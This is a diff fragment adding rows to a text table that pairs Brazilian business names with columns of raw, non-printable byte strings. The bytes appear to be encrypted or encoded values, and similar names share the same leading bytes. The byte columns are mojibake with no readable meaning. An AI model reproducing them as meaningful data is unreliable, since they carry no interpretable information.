+| 9  | R&D Assessoria             | w5+Sã4¨¨|\x1c\x90AT#yÔ÷@Ëü\nu\x07Yé#ipûŒ\x13\x10¦[Læ | w5+Sã4¨F;          |
+| 10 | Gui la Partio              | ‚VE î9$Ie’Êš~míg\x9d®À\x1b\x1b\x15é\x1dŒ%•           | îx]¨½€¥™ -H        |
+| 11 | Mary Assessoria Cerimonial | qÞ                                                   | ‚<¿ÿ:¸>Â           |
+| 12 | Mary Assessoria Cerimonial | qÞ                                                   | ‚<¿ÿ:¸>Â           |
+| 13 | Dani RD Assessoria         | w5+Sã4¨¨|\x1c\x90AT#yÔ÷@Ëü\nu\x07Yé#ipûŒ\x13\x10¦[Læ | w5+SÊ´¯k           |
+| 14 | RD Assessoria              | w5+Sã4¨¨|\x1c\x90AT#yÔ÷@Ëü\nu\x07Yé#ipûŒ\x13\x10¦[Læ | w5+SÊ´¯k           |
++----+----------------------------+------------------------------------------------------+--------------------+
+
